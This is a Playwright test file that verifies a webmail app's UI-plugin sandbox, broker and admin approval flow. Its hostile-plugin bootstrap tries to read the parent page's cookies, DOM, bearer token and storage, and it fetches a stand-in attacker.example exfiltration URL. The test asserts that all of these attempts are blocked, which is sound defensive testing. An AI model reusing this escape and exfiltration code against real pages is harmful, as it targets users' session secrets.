import { test, expect, type Page } from '@playwright/test';
import {
  PLUGIN_IFRAME_SANDBOX,
  LOCKED_PLUGIN_CSP,
  buildGuestSrcdoc,
  isTrustedGuestEvent,
  parseRpcRequest,
  brokerReject,
} from '../src/plugins-ui/host.ts';
import { classifyMessage } from '../src/plugins-ui/broker.ts';
import { RPC_PROTOCOL_VERSION, type UiPluginGrant, type UiPluginManifest } from '../src/plugins-ui/types.ts';
import { adminLogin, expectMounted } from './v7-helpers.ts';

/**
 * t10 §11 HEADLINE — the security-critical UI-plugin sandbox-escape gate, proven in a
 * REAL browser against the SHIPPED security core (`src/plugins-ui/host.ts` +
 * `broker.ts`) — the exact functions the running app uses (imported here, not
 * re-implemented). A hostile plugin is loaded into its opaque-origin
 * `<iframe sandbox="allow-scripts">` (NO `allow-same-origin`) and actively attempts every
 * escape vector; the browser + the deny-by-default broker must block ALL of them.
 *
 * This gate needs NO backend: the barrier is the browser's sandbox/opaque-origin +
 * CSP + the pure host broker, so it runs in every project (no `test.skip`). The
 * registry/approval HTTP contract (needs the live server) is proven separately below
 * and self-skips when no stack is reachable, matching the v6/v7 precedent.
 */

// A hostile guest: tries to break out and reports each result back to the host. This is
// the code path a malicious plugin would run inside the sandbox.
const MALICIOUS_BOOTSTRAP = `
(() => {
  const results = [];
  const attempt = (name, fn) => {
    try {
      const v = fn();
      results.push({ vector: name, blocked: false, detail: 'READ:' + String(v).slice(0, 60) });
    } catch (e) { results.push({ vector: name, blocked: true, detail: (e && e.name) || 'Error' }); }
  };
  attempt('host cookies (parent.document.cookie)', () => parent.document.cookie);
  attempt('host DOM (parent.document.body.innerHTML)', () => parent.document.body.innerHTML);
  attempt('window.parent.location.href', () => window.parent.location.href);
  attempt('top.location.href', () => top.location.href);
  attempt('host bearer token (parent.__MW_SESSION_TOKEN)', () => parent.__MW_SESSION_TOKEN);
  attempt('localStorage', () => { localStorage.setItem('x','1'); return localStorage.getItem('x'); });
  attempt('sessionStorage', () => { sessionStorage.setItem('x','1'); return sessionStorage.getItem('x'); });
  // Positive confirmation: the frame is opaque-origin (origin === "null"). Recorded as
  // "blocked" = barrier-in-place; a concrete origin would mean same-origin leaked in.
  (function () {
    const opaque = window.origin === 'null' || location.origin === 'null';
    results.push({ vector: 'opaque-origin barrier (origin === "null")', blocked: opaque, detail: 'origin=' + window.origin });
  })();
  (async () => {
    try { await fetch('https://attacker.example/exfil', { mode: 'no-cors' });
      results.push({ vector: 'direct fetch to non-allowlisted host', blocked: false, detail: 'resolved' });
    } catch (e) { results.push({ vector: 'direct fetch to non-allowlisted host', blocked: true, detail: (e && e.name) || 'TypeError' }); }
    parent.postMessage({ __t: 'guest-results', results }, '*');
  })();
})();
`;

const manifest: UiPluginManifest = {
  id: 'evil.plugin',
  name: 'Hostile Test Plugin',
  version: '1.0.0',
  signature: null,
  extensionPoints: ['compose-action'],
  capabilities: ['ui:compose-action'],
  csp: 'connect-src *', // advisory; the host LOCKED_PLUGIN_CSP must override it
};

interface GuestRow { vector: string; blocked: boolean; detail: string }

/** Load the hostile guest into a REAL sandboxed frame and collect its escape results. */
async function runGuestEscape(page: Page): Promise<GuestRow[]> {
  const srcdoc = buildGuestSrcdoc(manifest, MALICIOUS_BOOTSTRAP);
  await page.goto('about:blank');
  return page.evaluate(
    async ({ srcdoc, sandbox }) => {
      // Plant secrets a successful escape would exfiltrate. (Guarded: the top page may
      // itself be an opaque about:blank where cookie/storage writes throw — irrelevant to
      // the gate, which is that the GUEST cannot reach the parent regardless.)
      (window as unknown as Record<string, unknown>).__MW_SESSION_TOKEN = 'Bearer-DEADBEEF';
      try { document.cookie = 'mw_secret=SUPERSECRET; path=/'; } catch { /* opaque top */ }
      try { localStorage.setItem('mw_host_token', 'HOST-ONLY'); } catch { /* opaque top */ }

      const frame = document.createElement('iframe');
      frame.setAttribute('sandbox', sandbox);
      frame.setAttribute('referrerpolicy', 'no-referrer');
      frame.srcdoc = srcdoc;
      const done = new Promise<GuestRow[]>((resolve) => {
        window.addEventListener('message', (e) => {
          const d = e.data as Record<string, unknown>;
          if (d && d['__t'] === 'guest-results') resolve(d['results'] as GuestRow[]);
        });
      });
      document.body.appendChild(frame);
      return done;
    },
    { srcdoc, sandbox: PLUGIN_IFRAME_SANDBOX },
  );
}

test.describe('UI-plugin sandbox-escape gate (HEADLINE, security-critical)', () => {
  test('the sandbox attributes never grant same-origin (opaque-origin invariant)', () => {
    // The single load-bearing invariant: allow-scripts ONLY, never allow-same-origin.
    expect(PLUGIN_IFRAME_SANDBOX).toBe('allow-scripts');
    expect(PLUGIN_IFRAME_SANDBOX).not.toContain('allow-same-origin');
    // CSP forbids ANY direct socket — all egress must go through the host broker.
    expect(LOCKED_PLUGIN_CSP).toContain("connect-src 'none'");
    // The host injects its OWN locked CSP, not the manifest's permissive one.
    const doc = buildGuestSrcdoc(manifest);
    expect(doc).toContain(LOCKED_PLUGIN_CSP);
    expect(doc).not.toContain('connect-src *');
  });

  test('every guest escape vector is BLOCKED in a real sandboxed frame', async ({ page }) => {
    const rows = await runGuestEscape(page);
    // We expect one row per attempted vector, and EVERY one blocked.
    expect(rows.length).toBeGreaterThanOrEqual(9);
    const leaked = rows.filter((r) => !r.blocked);
    expect(leaked, `LEAKED vectors: ${JSON.stringify(leaked)}`).toHaveLength(0);
    // Spot-check the security-critical reads specifically resolved to a blocked error.
    const byVector = Object.fromEntries(rows.map((r) => [r.vector, r]));
    expect(byVector['host cookies (parent.document.cookie)']!.blocked).toBe(true);
    expect(byVector['host bearer token (parent.__MW_SESSION_TOKEN)']!.blocked).toBe(true);
    expect(byVector['direct fetch to non-allowlisted host']!.blocked).toBe(true);
  });

  test('the host broker denies spoofed, ungranted, and off-allowlist calls (deny-by-default)', () => {
    // The shipped pure gate — the ONLY channel a guest RPC can ride. `frameWindow` stands
    // in for the trusted frame identity; a real object reference plays the frame here.
    const frameWindow = { name: 'trusted-frame' } as unknown as Window;
    const grants: UiPluginGrant[] = [{ capability: 'ui:compose-action', params: {} }];
    const rpc = { v: RPC_PROTOCOL_VERSION, id: 'x:1', cap: 'net:host-allowlist', method: 'fetch', args: [] };

    // 1) Spoofed FOREIGN source (not the frame window) → ignored (never processed).
    expect(
      classifyMessage({ source: {} as Window, origin: 'https://evil.example', data: rpc }, grants, frameWindow),
    ).toEqual({ kind: 'ignore', reason: 'foreign-origin' });

    // 2) The frame window but a CONCRETE (non-null) origin claim → ignored.
    expect(
      classifyMessage({ source: frameWindow, origin: 'https://mail.host.example', data: rpc }, grants, frameWindow).kind,
    ).toBe('ignore');

    // 3) Trusted opaque-origin frame, but the capability was NEVER granted → capability-denied.
    const ungranted = classifyMessage({ source: frameWindow, origin: 'null', data: rpc }, grants, frameWindow);
    expect(ungranted.kind).toBe('reject');
    if (ungranted.kind === 'reject' && 'err' in ungranted.response) {
      expect(ungranted.response.err.code).toBe('capability-denied');
    }

    // 4) Granted cap but a method OFF its allowlist → method-denied.
    const kvGrants: UiPluginGrant[] = [{ capability: 'store:kv-scoped', params: {} }];
    const off = classifyMessage(
      { source: frameWindow, origin: 'null', data: { v: RPC_PROTOCOL_VERSION, id: 'x:2', cap: 'store:kv-scoped', method: 'delete', args: [] } },
      kvGrants, frameWindow,
    );
    expect(off.kind).toBe('reject');
    if (off.kind === 'reject' && 'err' in off.response) {
      expect(off.response.err.code).toBe('method-denied');
    }

    // 5) Allow-listed granted call → forwarded (the ONLY thing that reaches the network).
    const netGrants: UiPluginGrant[] = [{ capability: 'net:host-allowlist', params: { hosts: ['api.ok.example'] } }];
    expect(classifyMessage({ source: frameWindow, origin: 'null', data: rpc }, netGrants, frameWindow).kind).toBe('forward');
  });

  test('the inbound gate + payload narrowing reject foreign senders and malformed frames', () => {
    const frameWindow = { name: 'f' } as unknown as Window;
    // Only the exact frame window with an opaque origin is trusted.
    expect(isTrustedGuestEvent({ source: frameWindow, origin: 'null' }, frameWindow)).toBe(true);
    expect(isTrustedGuestEvent({ source: {} as Window, origin: 'null' }, frameWindow)).toBe(false);
    expect(isTrustedGuestEvent({ source: frameWindow, origin: 'https://evil' }, frameWindow)).toBe(false);
    expect(isTrustedGuestEvent({ source: frameWindow, origin: 'null' }, null)).toBe(false);
    // Malformed payloads narrow to null (dropped, no reply — no trustworthy id to answer).
    expect(parseRpcRequest({ v: 999, id: 'a', cap: 'store:kv-scoped', method: 'get', args: [] })).toBeNull();
    expect(parseRpcRequest({ v: RPC_PROTOCOL_VERSION, id: 'a', cap: 'not-a-cap', method: 'x', args: [] })).toBeNull();
    // brokerReject is deny-by-default at its own level.
    expect(brokerReject([], { v: RPC_PROTOCOL_VERSION, id: 'a', cap: 'net:host-allowlist', method: 'fetch', args: [] })?.code).toBe('capability-denied');
  });
});

/**
 * UI-plugin registry / admin-approval HTTP contract on the REAL server (needs the live
 * 26.10 stack). Self-skips loudly when no server is reachable, like plugins.spec.ts.
 */
test.describe('UI-plugin registry + admin approval + broker on the real server', () => {
  // A unique id per run so repeated runs against the persistent store never collide.
  const pluginId = `e15-snooze-${Date.now().toString(36)}`;
  const manifestFor = (id: string) => ({
    id,
    name: 'E15 Snooze',
    version: '1.0.0',
    signature: null, // unsigned ⇒ requires allowUnsigned + raises the persistent banner
    extensionPoints: ['message-toolbar'],
    capabilities: ['ui:message-toolbar', 'store:kv-scoped'],
    csp: "default-src 'none'",
  });

  test('the web registry + broker endpoints are mounted (deny-by-default) and admin-gated', async ({ request }) => {
    // Web-facing registry: mounted, fail-soft shape the SPA tier consumes.
    const reg = await request.get('/api/ui-plugins');
    expect(reg.status()).toBe(200);
    const body = await reg.json();
    expect(Array.isArray(body.plugins), 'registry exposes a plugin array').toBe(true);
    expect(Array.isArray(body.unsignedBanner), 'registry exposes the unsigned-banner id list').toBe(true);

    // The broker answers with its own handler; an unapproved/unknown plugin is denied.
    const rpc = await request.post('/api/ui-plugins/does-not-exist/rpc', {
      data: { v: RPC_PROTOCOL_VERSION, id: 'x:1', cap: 'net:host-allowlist', method: 'fetch', args: [] },
    });
    expectMounted(rpc.status(), 'POST /api/ui-plugins/{id}/rpc');
    expect((await rpc.json()).err.code).toBe('capability-denied');

    // Admin surface is admin-gated: unauthenticated ⇒ 401/403 (mounted, not 404/SPA).
    const adminList = await request.get('/admin/ui-plugins');
    expectMounted(adminList.status(), 'GET /admin/ui-plugins');
    expect([401, 403]).toContain(adminList.status());
  });

  test('unsigned upload → approve → grant → registry surfaces the banner; broker is deny-by-default', async ({ request }) => {
    await adminLogin(request);

    // Unsigned upload WITHOUT allowUnsigned fails closed (403) — never silently trusted.
    const closed = await request.post('/admin/ui-plugins', {
      data: { manifest: manifestFor('e15-fail-closed'), bundle: Buffer.from('b').toString('base64'), allowUnsigned: false },
    });
    expect(closed.status()).toBe(403);

    // Unsigned upload WITH allowUnsigned is admitted and signals the banner.
    const up = await request.post('/admin/ui-plugins', {
      data: { manifest: manifestFor(pluginId), bundle: Buffer.from('bundle').toString('base64'), allowUnsigned: true },
    });
    expect(up.status()).toBe(201);
    expect((await up.json()).bannerSignal).toBe(true);

    // Not yet approved ⇒ absent from the public registry (deny-by-default).
    let pub = await (await request.get('/api/ui-plugins')).json();
    expect(pub.plugins.some((p: { manifest: { id: string } }) => p.manifest.id === pluginId)).toBe(false);

    // Approve + enable, then grant ONE declared capability.
    expect((await request.post(`/admin/ui-plugins/${pluginId}/approve`)).status()).toBe(204);
    expect((await request.post(`/admin/ui-plugins/${pluginId}/grant`, { data: { capability: 'store:kv-scoped', params: {} } })).status()).toBe(200);

    // Granting an UNDECLARED capability is refused and never persisted (deny-by-default).
    const undeclared = await request.post(`/admin/ui-plugins/${pluginId}/grant`, {
      data: { capability: 'net:host-allowlist', params: { hosts: ['x.example'] } },
    });
    expect(undeclared.status()).toBe(400);
    expect((await undeclared.json()).granted).toBe(false);

    // Now the public registry serves the approved plugin AND lists it in unsignedBanner.
    pub = await (await request.get('/api/ui-plugins')).json();
    expect(pub.plugins.some((p: { manifest: { id: string } }) => p.manifest.id === pluginId)).toBe(true);
    expect(pub.unsignedBanner).toContain(pluginId);

    // Broker: granted cap+method forwards (put → ok); off-allowlist method + ungranted cap denied.
    const put = await request.post(`/api/ui-plugins/${pluginId}/rpc`, {
      data: { v: RPC_PROTOCOL_VERSION, id: 'r1', cap: 'store:kv-scoped', method: 'put', args: ['k', 'v'] },
    });
    expect((await put.json()).ok).toBeDefined();
    const del = await request.post(`/api/ui-plugins/${pluginId}/rpc`, {
      data: { v: RPC_PROTOCOL_VERSION, id: 'r2', cap: 'store:kv-scoped', method: 'delete', args: ['k'] },
    });
    expect((await del.json()).err.code).toBe('method-denied');
    const net = await request.post(`/api/ui-plugins/${pluginId}/rpc`, {
      data: { v: RPC_PROTOCOL_VERSION, id: 'r3', cap: 'net:host-allowlist', method: 'fetch', args: ['https://evil.example'] },
    });
    expect((await net.json()).err.code).toBe('capability-denied');

    // Cleanup: delete the plugin (cascades grants) so the run leaves no residue.
    expect((await request.delete(`/admin/ui-plugins/${pluginId}`)).status()).toBe(204);
    pub = await (await request.get('/api/ui-plugins')).json();
    expect(pub.plugins.some((p: { manifest: { id: string } }) => p.manifest.id === pluginId)).toBe(false);
  });
});

/**
 * The shipped SolidJS tier rendering in the REAL app: an approved unsigned plugin is
 * rendered inside its opaque-origin sandboxed iframe (allow-scripts, NO allow-same-origin)
 * beneath a persistent host-owned unsigned banner. Page-navigation against the live SPA.
 */
test.describe('UI-plugin tier renders in the real SPA (sandbox + banner)', () => {
  const pluginId = `e15-render-${Date.now().toString(36)}`;

  test.beforeAll(async ({ request }) => {
    await adminLogin(request);
    await request.post('/admin/ui-plugins', {
      data: {
        manifest: {
          id: pluginId, name: 'E15 Render', version: '1.0.0', signature: null,
          extensionPoints: ['message-toolbar'], capabilities: ['ui:message-toolbar'], csp: "default-src 'none'",
        },
        bundle: Buffer.from('bundle').toString('base64'),
        allowUnsigned: true,
      },
    });
    await request.post(`/admin/ui-plugins/${pluginId}/approve`);
  });

  test.afterAll(async ({ request }) => {
    await adminLogin(request);
    await request.delete(`/admin/ui-plugins/${pluginId}`);
  });

  test('the approved unsigned plugin renders sandboxed under the unsigned banner', async ({ page }) => {
    await uiLogin(page);
    // The lazy tier mounts; the persistent unsigned banner appears (host-owned, outside any iframe).
    const banner = page.getByTestId('ui-plugin-unsigned-banner');
    await expect(banner).toBeVisible();
    await expect(banner).toContainText(pluginId);

    // The plugin renders inside a sandboxed iframe with the opaque-origin attribute set.
    const frame = page.locator(`section[data-plugin-id="${pluginId}"] iframe`);
    await expect(frame).toHaveCount(1);
    const sandbox = await frame.getAttribute('sandbox');
    expect(sandbox).toBe('allow-scripts');
    expect(sandbox).not.toContain('allow-same-origin');
    // The banner is OUTSIDE the iframe → the plugin cannot hide or restyle it.
    const bannerInsideFrame = await page.locator(`iframe >> [data-testid="ui-plugin-unsigned-banner"]`).count().catch(() => 0);
    expect(bannerInsideFrame).toBe(0);
  });
});

/**
 * Additive-never-breaks-baseline (plan §11, item 4b): with no UI plugins and no SSO
 * configured, the login surface renders byte-unchanged — the tier is entirely absent
 * (it lives in the authenticated branch and renders nothing when the registry is empty).
 */
test.describe('Baseline renders unchanged in the real SPA (additive invariant)', () => {
  test('the login screen renders with no UI-plugin tier or banner leaking in', async ({ page }) => {
    await page.goto('/');
    // Baseline login controls render exactly as before the tail landed.
    await expect(page.getByRole('button', { name: 'Sign in' })).toBeVisible();
    await expect(page.getByLabel('JMAP server URL')).toBeVisible();
    // No UI-plugin surface bleeds into the unauthenticated baseline.
    await expect(page.getByTestId('ui-plugin-tier')).toHaveCount(0);
    await expect(page.getByTestId('ui-plugin-unsigned-banner')).toHaveCount(0);
  });
});

/** Log into the real SPA via the UI against the JMAP mock the server proxies to. */
async function uiLogin(page: Page): Promise<void> {
  const jmapUrl = process.env['MW_E2E_JMAP_URL'] ?? 'http://127.0.0.1:8181/.well-known/jmap';
  await page.goto('/');
  await expect(page.getByRole('button', { name: 'Sign in' })).toBeVisible();
  await page.getByLabel('JMAP server URL').fill(jmapUrl);
  await page.getByLabel('Username', { exact: true }).fill(process.env['MW_E2E_USERNAME'] ?? 'testuser@example.org');
  await page.getByLabel('Password', { exact: true }).fill(process.env['MW_E2E_PASSWORD'] ?? 'testpass');
  await page.getByRole('button', { name: 'Sign in' }).click();
  await expect(page.getByRole('button', { name: 'Compose' })).toBeVisible();
}

test.beforeEach(async ({ request }, testInfo) => {
  // The sandbox-escape gate (HEADLINE) runs unconditionally — browser-only, no backend.
  // The server-backed + SPA-render describes self-skip loudly when no stack is reachable.
  const serverBacked = /real server|real SPA/.test(testInfo.titlePath.join(' '));
  if (!serverBacked) return;
  const probe = await request.get('/api/ui-plugins').catch(() => null);
  test.skip(probe === null, `[e15 SKIP] ${testInfo.title}: no 26.10 mw-server reachable.`);
});
